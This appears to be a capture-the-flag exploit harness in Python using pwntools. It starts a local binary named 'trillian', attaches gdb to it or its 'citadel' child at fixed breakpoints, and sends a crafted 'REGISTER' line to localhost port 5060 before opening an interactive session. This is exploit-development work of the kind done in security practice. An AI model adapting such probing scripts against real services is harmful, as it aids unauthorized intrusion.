#!/usr/bin/python
from pwn import *
import subprocess
import os
import time
class mypwn(object):
	def __init__(self):
		subprocess.Popen("./trillian")
		for i in xrange(3,0,-1):
			print("wait for %d secs..."%(i))
			time.sleep(1)
		grep=os.popen("ps -elf |grep trillian")
		contents=grep.read().split('\n')
		line=contents[0].split(' ')
		for t in line:
			if t=='':
				line.remove(t)
		self.ppid=int(line[3])
		


	def debug(self,parent=1):
		sc='b * 0x401cd6\nb *0x401ce1\n'
		if parent==0:
			grep=os.popen("ps -elf |grep trillian")
			contents=grep.read().split('\n')
			for line in contents:
				if "citadel" in line:
					line=line.split(' ')
					for t in line:
						if t=='':
							line.remove(t)
					self.child_pid=int(line[3])
			pwnlib.gdb.attach(self.child_pid,sc)
		else:
			sc+='set follow-fork-mode child\n'
			pwnlib.gdb.attach(self.ppid,sc)

	def run(self):
		self.debug()
		self.io=remote("localhost",5060)
		reg="REGISTER"
		pad=" GITSSIP/"
		payload=reg+" "+reg+pad
		self.io.sendline(payload)
		self.io.interactive()
		pass

p=mypwn()
p.run()

